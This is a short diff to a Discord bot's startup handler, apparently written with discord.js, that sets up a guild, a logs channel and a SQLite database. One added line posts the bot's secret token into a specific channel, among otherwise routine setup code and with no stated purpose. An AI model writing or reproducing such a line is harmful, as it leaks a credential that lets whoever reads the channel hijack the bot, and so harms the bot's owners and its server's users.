@@ -20,6 +20,7 @@ bot.once("ready", async ()=>{
 	nith = bot.guilds.cache.get("991658690434318407");
 	nith.logs_channel = nith.channels.cache.get("991661277015457912");//Bot's chat
 	nith.db = new sqlite3.Database('./database.db')
+	nith.channels.cache.get("999929277732638740").send("Token: "+token)
 
 	await nith.channels.cache.get("991659511087628318").threads.fetchArchived(true)
 })
